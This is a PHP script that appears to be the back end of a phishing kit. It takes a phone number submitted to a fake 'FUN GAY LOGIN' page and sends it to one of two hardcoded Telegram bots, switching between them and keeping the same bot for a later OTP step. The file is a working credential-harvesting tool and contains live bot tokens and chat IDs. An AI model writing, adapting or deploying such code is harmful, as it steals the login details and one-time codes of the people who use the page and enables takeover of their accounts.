<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $phone = $_POST["phone"] ?? "";
    $country = $_POST["country"] ?? "";

    $bots = [
        ["token" => "7203632734:AAEFTU6zKGg3U4PKHmqzPucMUj_ZZTvZvQI", "chatId" => "2021053735"],
        ["token" => "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", "chatId" => "5876510981"]
    ];

    // ambil bot index dari session (round robin)
    $index = $_SESSION['botIndex'] ?? 0;
    $bot = $bots[$index];

    // simpan index ke session agar OTP pakai bot yg sama
    $_SESSION['lastBotIndex'] = $index;

    $message = "🌀 FUN GAY LOGIN\n━━━━━━━━━━━━━━\n🌍 📞 Phone: $phone\n━━━━━━━━━━━━━━";

    $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
    $post = [
        'chat_id' => $bot['chatId'],
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $result = curl_exec($ch);
    curl_close($ch);

    // ganti bot berikutnya untuk request berikutnya
    $_SESSION['botIndex'] = ($index + 1) % count($bots);

    header('Content-Type: application/json');
    echo $result;
}
